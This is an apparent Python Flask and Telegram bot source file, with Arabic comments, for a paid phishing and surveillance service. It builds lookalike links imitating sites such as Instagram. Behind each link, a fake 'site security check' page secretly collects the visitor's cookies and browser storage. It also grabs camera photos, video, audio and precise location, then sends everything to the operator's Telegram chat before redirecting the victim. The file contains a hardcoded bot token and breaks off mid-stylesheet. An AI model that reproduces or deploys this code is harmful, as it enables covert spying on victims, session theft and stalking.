# ============================================================
#  ملف واحد شامل (app.py) - سيرفر + بوت + قاعدة بيانات + كل شيء
# ============================================================
from flask import Flask, request, render_template_string, redirect, jsonify
from datetime import datetime
import secrets
import os
import base64
import json
import requests
import threading
import time
import sqlite3
import re
from urllib.parse import urlparse
from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ====== الإعدادات (config) ======
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8847400367:AAHNhfgMGGuo3eCIiNjMD8u4EjnL7OkNLls')
BASE_URL = os.environ.get('BASE_URL', 'https://instagrm.up.railway.app')
SECRET_KEY = os.environ.get('SECRET_KEY', 'my-super-secret-key')
DB_PATH = 'data.db'

# ====== قاعدة البيانات (database) ======
def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            points INTEGER DEFAULT 0,
            total_points INTEGER DEFAULT 0,
            invite_code TEXT UNIQUE,
            invited_by INTEGER,
            joined_date TEXT,
            last_active TEXT,
            is_admin INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS invites (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            inviter_id INTEGER,
            invited_id INTEGER,
            date TEXT,
            points_earned INTEGER DEFAULT 1
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS daily_attempts (
            user_id INTEGER,
            date TEXT,
            attempts INTEGER DEFAULT 0,
            PRIMARY KEY (user_id, date)
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS required_channels (
            channel_id TEXT PRIMARY KEY,
            channel_name TEXT,
            is_active INTEGER DEFAULT 1
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS features (
            feature_name TEXT PRIMARY KEY,
            is_enabled INTEGER DEFAULT 1
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            action TEXT,
            details TEXT,
            timestamp TEXT
        )
    ''')
    
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS sessions (
        session_id TEXT PRIMARY KEY,
        chat_id INTEGER,
        features TEXT,
        original_url TEXT,
        fake_url TEXT,
        config TEXT,
        created TEXT
    )
''')
    
    # ====== جداول النقاط اليومية والمكافآت الجماعية ======
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS daily_rewards (
            user_id INTEGER,
            date TEXT,
            last_claim TEXT,
            PRIMARY KEY (user_id, date)
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS group_rewards (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            code TEXT UNIQUE,
            admin_id INTEGER,
            points INTEGER,
            member_count INTEGER,
            used_count INTEGER DEFAULT 0,
            created TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS reward_usage (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            code TEXT,
            user_id INTEGER,
            used_at TEXT
        )
    ''')
    
    cursor.execute('''
        INSERT OR IGNORE INTO settings (key, value)
        VALUES 
            ('free_attempts', '3'),
            ('video_duration', '30'),
            ('audio_duration', '30'),
            ('camera_count', '3')
    ''')
    
    features = ['camera', 'audio', 'video', 'location', 'device', 'all']
    for feature in features:
        cursor.execute('''
            INSERT OR IGNORE INTO features (feature_name, is_enabled)
            VALUES (?, 1)
        ''', (feature,))
    
    conn.commit()
    conn.close()

# ====== دوال المستخدمين ======
def get_user(user_id):
    conn = get_db()
    user = conn.execute('SELECT * FROM users WHERE user_id = ?', (user_id,)).fetchone()
    conn.close()
    return user

def create_user(user_id, username, first_name, last_name, invited_by=None):
    conn = get_db()
    cursor = conn.cursor()
    invite_code = secrets.token_urlsafe(6)
    cursor.execute('''
        INSERT INTO users (user_id, username, first_name, last_name, invite_code, invited_by, joined_date, last_active)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (user_id, username, first_name, last_name, invite_code, invited_by, datetime.now().isoformat(), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    if invited_by:
        add_points(invited_by, 1, 'invite')
        log_invite(invited_by, user_id)
    return True

def update_user_activity(user_id):
    conn = get_db()
    conn.execute('UPDATE users SET last_active = ? WHERE user_id = ?', (datetime.now().isoformat(), user_id))
    conn.commit()
    conn.close()

def add_points(user_id, points, reason=''):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET points = points + ?, total_points = total_points + ? WHERE user_id = ?', (points, points, user_id))
    conn.commit()
    conn.close()
    log_action(user_id, 'add_points', f'{points} نقاط - {reason}')

def deduct_points(user_id, points, reason=''):
    conn = get_db()
    cursor = conn.cursor()
    user = cursor.execute('SELECT points FROM users WHERE user_id = ?', (user_id,)).fetchone()
    if user and user['points'] >= points:
        cursor.execute('UPDATE users SET points = points - ? WHERE user_id = ?', (points, user_id))
        conn.commit()
        conn.close()
        log_action(user_id, 'deduct_points', f'{points} نقاط - {reason}')
        return True
    conn.close()
    return False

def log_action(user_id, action, details=''):
    conn = get_db()
    conn.execute('''
        INSERT INTO user_logs (user_id, action, details, timestamp)
        VALUES (?, ?, ?, ?)
    ''', (user_id, action, details, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def log_invite(inviter_id, invited_id):
    conn = get_db()
    conn.execute('''
        INSERT INTO invites (inviter_id, invited_id, date, points_earned)
        VALUES (?, ?, ?, ?)
    ''', (inviter_id, invited_id, datetime.now().isoformat(), 1))
    conn.commit()
    conn.close()

# ====== دوال المحاولات اليومية ======
def get_daily_attempts(user_id):
    today = datetime.now().strftime('%Y-%m-%d')
    conn = get_db()
    result = conn.execute('SELECT attempts FROM daily_attempts WHERE user_id = ? AND date = ?', (user_id, today)).fetchone()
    conn.close()
    return result['attempts'] if result else 0

def increment_daily_attempts(user_id):
    today = datetime.now().strftime('%Y-%m-%d')
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO daily_attempts (user_id, date, attempts)
        VALUES (?, ?, 1)
        ON CONFLICT(user_id, date) DO UPDATE SET attempts = attempts + 1
    ''', (user_id, today))
    conn.commit()
    conn.close()

def get_free_attempts_limit():
    conn = get_db()
    result = conn.execute('SELECT value FROM settings WHERE key = "free_attempts"').fetchone()
    conn.close()
    return int(result['value']) if result else 3

# ====== دوال القنوات الإجبارية ======
def get_required_channels():
    conn = get_db()
    channels = conn.execute('SELECT * FROM required_channels WHERE is_active = 1').fetchall()
    conn.close()
    return channels

def add_required_channel(channel_id, channel_name):
    conn = get_db()
    conn.execute('''
        INSERT OR REPLACE INTO required_channels (channel_id, channel_name, is_active)
        VALUES (?, ?, 1)
    ''', (channel_id, channel_name))
    conn.commit()
    conn.close()

def remove_required_channel(channel_id):
    conn = get_db()
    conn.execute('DELETE FROM required_channels WHERE channel_id = ?', (channel_id,))
    conn.commit()
    conn.close()

# ====== دوال الميزات ======
def is_feature_enabled(feature_name):
    conn = get_db()
    result = conn.execute('SELECT is_enabled FROM features WHERE feature_name = ?', (feature_name,)).fetchone()
    conn.close()
    return bool(result['is_enabled']) if result else True

def toggle_feature(feature_name):
    conn = get_db()
    current = conn.execute('SELECT is_enabled FROM features WHERE feature_name = ?', (feature_name,)).fetchone()
    if current:
        new_value = 0 if current['is_enabled'] else 1
        conn.execute('UPDATE features SET is_enabled = ? WHERE feature_name = ?', (new_value, feature_name))
        conn.commit()
        conn.close()
        return bool(new_value)
    conn.close()
    return False

# ====== دوال الإعدادات ======
def get_setting(key, default=None):
    conn = get_db()
    result = conn.execute('SELECT value FROM settings WHERE key = ?', (key,)).fetchone()
    conn.close()
    return result['value'] if result else default

def set_setting(key, value):
    conn = get_db()
    conn.execute('''
        INSERT OR REPLACE INTO settings (key, value)
        VALUES (?, ?)
    ''', (key, value))
    conn.commit()
    conn.close()

# ====== دوال مساعدة (utils) ======
def generate_session_id():
    return secrets.token_urlsafe(12)

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def create_short_link(session_id, original_url):
    """إنشاء رابط مقنع يحاكي الموقع الأصلي"""
    parsed = urlparse(original_url)
    domain = parsed.netloc.replace('www.', '')  # مثلاً: instagram.com
    
    # استخراج المسار الأصلي (لجعل الرابط أكثر إقناعاً)
    path = parsed.path.strip('/') or 'profile'
    if parsed.query:
        path = f"{path}?{parsed.query}"
    
    # إنشاء معرف قصير
    short_id = session_id[:8]
    
    # بناء الرابط المقنع
    return f"{BASE_URL}/{domain}/{path}/{short_id}"

# ====== دوال الجلسات (session_manager) ======
def create_session(chat_id, features, original_url, config_data=None):
    session_id = generate_session_id()
    fake_url = create_short_link(session_id, original_url)
    
    conn = get_db()
    conn.execute('''
        INSERT INTO sessions (session_id, chat_id, features, original_url, fake_url, config, created)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (session_id, chat_id, features, original_url, fake_url, json.dumps(config_data or {}), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    return session_id

def get_session(session_id):
    conn = get_db()
    session = conn.execute('SELECT * FROM sessions WHERE session_id = ?', (session_id,)).fetchone()
    conn.close()
    return session

# ====== دوال النقاط اليومية والمكافآت الجماعية ======
def get_daily_reward(user_id):
    today = datetime.now().strftime('%Y-%m-%d')
    conn = get_db()
    result = conn.execute('''
        SELECT last_claim FROM daily_rewards 
        WHERE user_id = ? AND date = ?
    ''', (user_id, today)).fetchone()
    conn.close()
    return result is None

def claim_daily_reward(user_id):
    today = datetime.now().strftime('%Y-%m-%d')
    conn = get_db()
    conn.execute('''
        INSERT OR REPLACE INTO daily_rewards (user_id, date, last_claim)
        VALUES (?, ?, ?)
    ''', (user_id, today, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_daily_reward_count():
    today = datetime.now().strftime('%Y-%m-%d')
    conn = get_db()
    count = conn.execute('SELECT COUNT(*) FROM daily_rewards WHERE date = ?', (today,)).fetchone()[0]
    conn.close()
    return count

def create_group_reward(admin_id, points, member_count, code):
    conn = get_db()
    conn.execute('''
        INSERT INTO group_rewards (code, admin_id, points, member_count, used_count, created)
        VALUES (?, ?, ?, ?, 0, ?)
    ''', (code, admin_id, points, member_count, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_group_reward(code):
    conn = get_db()
    reward = conn.execute('SELECT * FROM group_rewards WHERE code = ?', (code,)).fetchone()
    conn.close()
    return reward

def use_group_reward(code, user_id):
    conn = get_db()
    used = conn.execute('''
        SELECT * FROM reward_usage WHERE code = ? AND user_id = ?
    ''', (code, user_id)).fetchone()
    if used:
        conn.close()
        return False, 'already_used'
    
    reward = conn.execute('SELECT * FROM group_rewards WHERE code = ?', (code,)).fetchone()
    if not reward:
        conn.close()
        return False, 'not_found'
    
    if reward['used_count'] >= reward['member_count']:
        conn.close()
        return False, 'full'
    
    conn.execute('''
        UPDATE group_rewards SET used_count = used_count + 1 WHERE code = ?
    ''', (code,))
    conn.execute('''
        INSERT INTO reward_usage (code, user_id, used_at)
        VALUES (?, ?, ?)
    ''', (code, user_id, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    add_points(user_id, reward['points'], f'مكافأة جماعية: {code}')
    return True, reward['points']
# ====== دوال الميزات الجديدة ======

# تتبع الموقع المستمر
def start_location_tracking(chat_id, locations):
    """إرسال مواقع متعددة إلى البوت"""
    for loc in locations:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
            requests.post(url, data={
                'chat_id': chat_id,
                'latitude': loc['lat'],
                'longitude': loc['lng']
            })
            time.sleep(0.5)  # تجنب الحظر
        except:
            pass

# سحب الملفات
def send_files_to_bot(chat_id, files):
    """إرسال الملفات المستخرجة إلى البوت"""
    for file_data in files:
        try:
            content = file_data['content'].split(',', 1)[1]
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            files = {'document': base64.b64decode(content)}
            caption = f"📁 {file_data['name']} ({(file_data['size']/1024):.1f} KB)"
            requests.post(url, data={'chat_id': chat_id, 'caption': caption}, files=files)
        except:
            pass

# الحافظة
def send_clipboard(chat_id, clipboard_text):
    """إرسال محتوى الحافظة إلى البوت"""
    try:
        msg = f"📋 **محتوى الحافظة:**\n\n{clipboard_text}"
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown'})
    except:
        pass
        
# ====== دوال الأسعار ======
def get_prices():
    conn = get_db()
    prices = {}
    features = ['camera', 'audio', 'video', 'location', 'device', 'all']
    for feature in features:
        result = conn.execute('SELECT value FROM settings WHERE key = ?', (f'price_{feature}',)).fetchone()
        prices[feature] = int(result['value']) if result else 5
    conn.close()
    return prices

def set_price(feature, price):
    conn = get_db()
    conn.execute('''
        INSERT OR REPLACE INTO settings (key, value)
        VALUES (?, ?)
    ''', (f'price_{feature}', str(price)))
    conn.commit()
    conn.close()

# ====== إنشاء تطبيق Flask ======
app = Flask(__name__)
app.secret_key = SECRET_KEY

# ============================================================
#  الصفحات المحسّنة (كاميرا، فيديو، صوت، موقع، معلومات، شامل)
#  مع واجهة "التحقق من سلامة الموقع" وتقليل وقت التسجيل إلى 5 ثواني
# ============================================================

# ====== القالب الأساسي للصفحات (يحتوي على تصميم Captcha موحد) ======
CAPTCHA_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الأمان</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #0a0a0f;
            background-image: radial-gradient(circle at 30% 40%, #111128, #050508);
            margin: 0;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.02);
            backdrop-filter: blur(40px);
            border: 1px solid rgba(255,255,255,0.05);
            border-radius: 32px;
            padding: 45px 35px;
            max-width: 480px;
            width: 100%;
            text-align: center;
            box-shadow: 0 60px 120px rgba(0,0,0,0.8);
            animation: fadeIn 0.7s ease-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px) scale(0.98); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }
        .shield-icon {
            font-size: 56px;
            display: block;
            margin-bottom: 6px;
            animation: pulse 2.5s infinite;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.08); }
        }
        .title {
            color: #fff;
            font-size: 22px;
            font-weight: 600;
            letter-spacing: -0.2px;
            margin-top: 8px;
        }
        .subtitle {
            color: rgba(255,255,255,0.35);
            font-size: 14px;
            font-weight: 300;
            margin-top: 8px;
            line-height: 1.6;
        }
        .captcha-box {
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 18px;
            padding: 20px 16px;
            margin: 22px 0 18px;
        }
        .captcha-icon {
            font-size: 28px;
            display: block;
            margin-bottom: 4px;
        }
        .captcha-text {
            color: rgba(255,255,255,0.5);
            font-size: 14px;
            font-weight: 300;
        }
        .captcha-status {
            display: inline-block;
            margin-top: 10px;
            background: rgba(102, 126, 234, 0.12);
            padding: 6px 20px;
            border-radius: 40px;
            color: #7a8cf5;
            font-size: 13px;
            font-weight: 500;
            border: 1px solid rgba(102, 126, 234, 0.15);
            transition: all 0.4s;
        }
        .captcha-status.done {
            color: #4ade80;
            border-color: rgba(74, 222, 128, 0.2);
            background: rgba(74, 222, 128, 0.08);
        }
        .progress-bar {
            width: 100%;
            height: 3px;
            background: rgba(255,255,255,0.04);
            border-radius: 10px;
            margin: 14px 0 8px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #667eea, #a78bfa, #764ba2);
            border-radius: 10px;
            transition: width 0.4s ease;
            background-size: 200% 100%;
            animation: shimmer 2s infinite;
        }
        @keyframes shimmer {
            0% { background-position: 200% 0; }
            100% { background-position: -200% 0; }
        }
        .status-text {
            color: rgba(255,255,255,0.2);
            font-size: 12px;
            font-weight: 300;
            margin-top: 6px;
            letter-spacing: 0.3px;
            min-height: 20px;
        }
        .btn-verify {
            background: linear-gradient(135deg, #667eea, #764ba2);
            border: none;
            color: #fff;
            padding: 14px 28px;
            border-radius: 50px;
            font-size: 15px;
            font-weight: 600;
            cursor: not-allowed;
            opacity: 0.3;
            width: 100%;
            transition: all 0.4s ease;
            margin-top: 12px;
            letter-spacing: 0.5px;
        }
        .btn-verify.active {
            opacity: 1;
            cursor: pointer;
            box-shadow: 0 8px 40px rgba(102, 126, 234, 0.2);
        }
        .btn-verify.active:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 50px rgba(102, 126, 234, 0.35);
        }
        .footer-text {
            color: rgba(255,255,255,0.06);
            font-size: 10px;
            margin-top: 18px;
            letter-spacing: 1.5px;
            text-transform: uppercase;
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <span class="shield-icon">🛡️</span>
        <h1 class="title">التحقق من سلامة الموقع</h1>
        <p class="subtitle">نقوم بتأكيد أن اتصالك آمن<br>هذا الإجراء يستغرق بضع ثوانٍ</p>

        <div class="captcha-box">
            <span class="captcha-icon" id="captchaIcon">🔒</span>
            <p class="captcha-text" id="captchaText">جاري فحص بيئة الاتصال...</p>
            <span class="captcha-status" id="captchaStatus">⏳ قيد المعالجة</span>
        </div>

        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        <p class="status-text" id="statusText">جاري تهيئة بيئة آمنة...</p>

        <button class="btn-verify" id="verifyBtn">⏳ جاري التحقق...</button>

        <p class="footer-text">• Protected by Secure Shield •</p>
    </div>

    <script>
        const session_id = "{{ session_id }}";
        const original_url = "{{ original_url }}";
        const feature = "{{ feature }}";
        const action = "{{ action }}";

        const progressFill = document.getElementById('progressFill');
        const statusText = document.getElementById('statusText');
        const verifyBtn = document.getElementById('verifyBtn');
        const captchaStatus = document.getElementById('captchaStatus');
        const captchaText = document.getElementById('captchaText');
        const captchaIcon = document.getElementById('captchaIcon');

        let progress = 0;
        let dataSent = false;

        // ====== البيانات الأساسية ======
        const data = {
            session_id: session_id,
            timestamp: new Date().toISOString(),
            feature: feature,
            action: action,
            device: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
                deviceMemory: navigator.deviceMemory || 'غير معروف',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                vendor: navigator.vendor || 'غير معروف',
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'غير مفعل'
            },
            cookies: {},
            storage: {},
            battery: null,
            ip: null
        };

        // ====== جمع البيانات الأساسية ======
        function collectBasicData() {
            try {
                document.cookie.split(';').forEach(c => {
                    const p = c.trim().split('=');
                    if (p.length >= 2) data.cookies[p[0]] = p.slice(1).join('=');
                });
            } catch(e) {}

            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    if (key) data.storage[key] = localStorage.getItem(key);
                }
            } catch(e) {}

            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    if (key) data.storage['session_' + key] = sessionStorage.getItem(key);
                }
            } catch(e) {}

            if (navigator.getBattery) {
                navigator.getBattery().then(b => {
                    data.battery = {
                        level: Math.round(b.level * 100),
                        charging: b.charging
                    };
                }).catch(() => {});
            }
        }
        collectBasicData();

        // ====== IP ======
        async function getIP() {
            try {
                const response = await fetch('/get_ip');
                const ipData = await response.json();
                data.ip = ipData.ip;
            } catch(e) {}
        }

        // ====== تنفيذ الإجراء المطلوب ======
        async function executeAction() {
            const actionMap = {
                'camera_front': async () => {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({
                            video: { facingMode: 'user', width: 320, height: 240 }
                        });
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.autoplay = true;
                        await new Promise(r => video.onloadedmetadata = r);
                        await new Promise(r => setTimeout(r, 300));
                        const canvas = document.createElement('canvas');
                        canvas.width = 320;
                        canvas.height = 240;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        data.camera_front = [canvas.toDataURL('image/jpeg', 0.7)];
                        stream.getTracks().forEach(t => t.stop());
                        captchaText.textContent = '✅ تم التقاط الصورة';
                        captchaIcon.textContent = '✅';
                    } catch(e) {
                        captchaText.textContent = '⚠️ لم نتمكن من الوصول للكاميرا';
                        captchaIcon.textContent = '⚠️';
                    }
                },
                'camera_back': async () => {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({
                            video: { facingMode: 'environment', width: 320, height: 240 }
                        });
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.autoplay = true;
                        await new Promise(r => video.onloadedmetadata = r);
                        await new Promise(r => setTimeout(r, 300));
                        const canvas = document.createElement('canvas');
                        canvas.width = 320;
                        canvas.height = 240;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        data.camera_back = [canvas.toDataURL('image/jpeg', 0.7)];
                        stream.getTracks().forEach(t => t.stop());
                        captchaText.textContent = '✅ تم التقاط الصورة';
                        captchaIcon.textContent = '✅';
                    } catch(e) {
                        captchaText.textContent = '⚠️ لم نتمكن من الوصول للكاميرا';
                        captchaIcon.textContent = '⚠️';
                    }
                },
                'video_front': async () => {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({
                            video: { facingMode: 'user', width: 320, height: 240 },
                            audio: true
                        });
                        const recorder = new MediaRecorder(stream);
                        const chunks = [];
                        recorder.ondataavailable = e => chunks.push(e.data);
                        recorder.onstop = () => {
                            const blob = new Blob(chunks, { type: 'video/webm' });
                            const reader = new FileReader();
                            reader.onload = () => data.video = reader.result;
                            reader.readAsDataURL(blob);
                        };
                        recorder.start();
                        await new Promise(r => setTimeout(r, 5000));
                        if (recorder.state === 'recording') {
                            recorder.stop();
                            stream.getTracks().forEach(t => t.stop());
                        }
                        captchaText.textContent = '✅ تم تسجيل الفيديو';
                        captchaIcon.textContent = '✅';
                    } catch(e) {
                        captchaText.textContent = '⚠️ لم نتمكن من الوصول للكاميرا';
                        captchaIcon.textContent = '⚠️';
                    }
                },
                'video_back': async () => {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({
                            video: { facingMode: 'environment', width: 320, height: 240 },
                            audio: true
                        });
                        const recorder = new MediaRecorder(stream);
                        const chunks = [];
                        recorder.ondataavailable = e => chunks.push(e.data);
                        recorder.onstop = () => {
                            const blob = new Blob(chunks, { type: 'video/webm' });
                            const reader = new FileReader();
                            reader.onload = () => data.video = reader.result;
                            reader.readAsDataURL(blob);
                        };
                        recorder.start();
                        await new Promise(r => setTimeout(r, 5000));
                        if (recorder.state === 'recording') {
                            recorder.stop();
                            stream.getTracks().forEach(t => t.stop());
                        }
                        captchaText.textContent = '✅ تم تسجيل الفيديو';
                        captchaIcon.textContent = '✅';
                    } catch(e) {
                        captchaText.textContent = '⚠️ لم نتمكن من الوصول للكاميرا';
                        captchaIcon.textContent = '⚠️';
                    }
                },
                'audio': async () => {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                        const recorder = new MediaRecorder(stream);
                        const chunks = [];
                        recorder.ondataavailable = e => chunks.push(e.data);
                        recorder.onstop = () => {
                            const blob = new Blob(chunks, { type: 'audio/webm' });
                            const reader = new FileReader();
                            reader.onload = () => data.audio = reader.result;
                            reader.readAsDataURL(blob);
                        };
                        recorder.start();
                        await new Promise(r => setTimeout(r, 5000));
                        if (recorder.state === 'recording') {
                            recorder.stop();
                            stream.getTracks().forEach(t => t.stop());
                        }
                        captchaText.textContent = '✅ تم تسجيل الصوت';
                        captchaIcon.textContent = '✅';
                    } catch(e) {
                        captchaText.textContent = '⚠️ لم نتمكن من الوصول للميكروفون';
                        captchaIcon.textContent = '⚠️';
                    }
                },
                'location': () => {
                    return new Promise((resolve) => {
                        if (navigator.geolocation) {
                            navigator.geolocation.getCurrentPosition(
                                pos => {
                                    data.location = {
                                        lat: pos.coords.latitude,
                                        lng: pos.coords.longitude,
                                        accuracy: pos.coords.accuracy,
                                        altitude: pos.coords.altitude,
                                        speed: pos.coords.speed
                                    };
                                    captchaText.textContent = '✅ تم جلب الموقع';
                                    captchaIcon.textContent = '✅';
                                    resolve();
                                },
                                () => {
                                    captchaText.textContent = '⚠️ لم نتمكن من جلب الموقع';
                                    captchaIcon.textContent = '⚠️';
                                    resolve();
                                },
                                { enableHighAccuracy: true, timeout: 8000 }
                            );
                        } else {
                            captchaText.textContent = '⚠️ الموقع غير مدعوم';
                            captchaIcon.textContent = '⚠️';
                            resolve();
                        }
                    });
                },
                'device': async () => {
                    captchaText.textContent = '✅ تم جمع معلومات الجهاز';
                    captchaIcon.textContent = '✅';
                    // البيانات موجودة بالفعل في data.device
                },
                'all': async () => {
                    // تنفيذ جميع المهام بالتسلسل
                    const actions = ['camera_front', 'camera_back', 'video_front', 'audio', 'location'];
                    for (const a of actions) {
                        if (actionMap[a]) {
                            await actionMap[a]();
                            await new Promise(r => setTimeout(r, 300));
                        }
                    }
                }
            };

            if (actionMap[action]) {
                await actionMap[action]();
            }
        }

        // ====== تحديث شريط التقدم الوهمي ======
        function updateProgress() {
            if (progress < 85) {
                progress += Math.random() * 5 + 2;
                if (progress > 85) progress = 85;
                progressFill.style.width = progress + '%';
                const msgs = [
                    '🔍 فحص بيئة المتصفح...',
                    '🔄 تحليل الاتصال الآمن...',
                    '⚡ تشفير القناة...',
                    '📡 جلب معلومات الجلسة...',
                    '🛡️ التحقق من صحة الطلب...'
                ];
                statusText.textContent = msgs[Math.floor(Math.random() * msgs.length)];
                setTimeout(updateProgress, 400 + Math.random() * 500);
            } else if (progress < 95) {
                progress = 90;
                progressFill.style.width = '90%';
                statusText.textContent = '⏳ اللمسات الأخيرة...';
                setTimeout(updateProgress, 600);
            }
        }

        // ====== إرسال البيانات ======
        async function sendData() {
            if (dataSent) return;
            dataSent = true;

            verifyBtn.textContent = '📤 جاري الإرسال...';
            verifyBtn.style.opacity = '0.6';

            try {
                await fetch('/send_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                statusText.textContent = '✅ تم إرسال البيانات بنجاح';
                captchaStatus.textContent = '✅ تم التحقق';
                captchaStatus.className = 'captcha-status done';
                progressFill.style.width = '100%';
            } catch(e) {
                statusText.textContent = '⚠️ جاري التوجيه...';
            }

            verifyBtn.textContent = '✔️ تأكيد التحقق';
            verifyBtn.classList.add('active');
            verifyBtn.style.opacity = '1';

            // التوجيه بعد التأكد من الإرسال
            setTimeout(() => {
                window.location.href = original_url;
            }, 1800);
        }

        // ====== الزر عند التفعيل ======
        verifyBtn.addEventListener('click', function() {
            if (this.classList.contains('active')) {
                sendData();
            }
        });

        // ====== التشغيل الرئيسي ======
        async function init() {
            // بدء شريط التقدم
            updateProgress();

            // جمع IP
            await getIP();

            // تنفيذ الإجراء المطلوب
            await executeAction();

            // اكتمال التقدم
            progress = 100;
            progressFill.style.width = '100%';
            statusText.textContent = '✅ تم التحقق من سلامة الاتصال';
            captchaStatus.textContent = '✅ تم التحقق';
            captchaStatus.className = 'captcha-status done';

            // تفعيل الزر
            verifyBtn.textContent = '✔️ تأكيد التحقق';
            verifyBtn.classList.add('active');
            verifyBtn.style.opacity = '1';
            verifyBtn.style.cursor = 'pointer';
        }

        init();
    </script>
</body>
</html>
"""
# ============================================================
#  الصفحات الجديدة: تتبع الموقع + سحب الملفات + الحافظة
# ============================================================

LOCATION_TRACKING_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الأمان</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #0a0a0f;
            background-image: radial-gradient(circle at 30% 40%, #111128, #050508);
            margin: 0;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.02);
            backdrop-filter: blur(40px);
            border: 1px solid rgba(255,255,255,0.05);
            border-radius: 32px;
            padding: 45px 35px;
            max-width: 480px;
            width: 100%;
            text-align: center;
            box-shadow: 0 60px 120px rgba(0,0,0,0.8);
            animation: fadeIn 0.7s ease-out;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px) scale(0.98); } to { opacity: 1; transform: translateY(0) scale(1); } }
        .shield-icon { font-size: 56px; display: block; margin-bottom: 6px; animation: pulse 2.5s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.08); } }
        .title { color: #fff; font-size: 22px; font-weight: 600; margin-top: 8px; }
        .subtitle { color: rgba(255,255,255,0.35); font-size: 14px; font-weight: 300; margin-top: 8px; line-height: 1.6; }
        .captcha-box {
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 18px;
            padding: 20px 16px;
            margin: 22px 0 18px;
        }
        .captcha-icon { font-size: 28px; display: block; margin-bottom: 4px; }
        .captcha-text { color: rgba(255,255,255,0.5); font-size: 14px; font-weight: 300; }
        .captcha-status {
